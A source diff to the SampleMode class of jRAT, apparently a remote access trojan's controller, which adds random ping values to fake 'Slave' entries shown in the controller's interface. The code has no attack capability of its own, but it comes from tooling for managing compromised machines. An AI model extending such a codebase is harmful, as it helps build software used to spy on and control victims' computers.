@@ -4,7 +4,9 @@ import java.util.Random;
 
 import se.jrat.client.net.ConnectionHandler;
 import se.jrat.client.settings.Statistics;
+import se.jrat.client.ui.frames.Frame;
 import se.jrat.client.utils.NetUtils;
+import se.jrat.client.utils.Utils;
 
 
 public class SampleMode {
@@ -31,8 +33,10 @@ public class SampleMode {
 		int i = (new Random()).nextInt(65535);
 
 		String ip = NetUtils.randomizeIP() + " / " + i;
+		
+		int p = new Random().nextInt(500);
 
-		Slave slave = generate(country, os, ip);
+		Slave slave = generate(country, os, ip, p);
 
 		if (stats) {
 			int howMany = new Random().nextInt(100);
@@ -44,6 +48,7 @@ public class SampleMode {
 			slave.setOperatingSystem(os);
 			slave.setStatus(5);
 			slave.setServerID(Constants.NAME + new Random().nextInt(1000));
+			slave.setPing(p);
 			slave.setComputerName("Sample");
 			slave.setUsername("Sample");
 		}
@@ -53,7 +58,7 @@ public class SampleMode {
 		return COUNTRIES[new Random().nextInt(COUNTRIES.length - 1)];
 	}
 
-	public static Slave generate(final String c, final String os, String ip) {
+	public static Slave generate(final String c, final String os, String ip, final int p) {
 		Slave slave = new Slave(ip) {
 			@Override
 			public String getCountry() {
@@ -65,6 +70,11 @@ public class SampleMode {
 				return os;
 			}
 			
+			@Override
+			public int getPing() {
+				Frame.mainModel.setValueAt(p + " ms", Utils.getRow(3, getIP()), 4);		
+				return p;
+			}
 		};
 		
 		return slave;
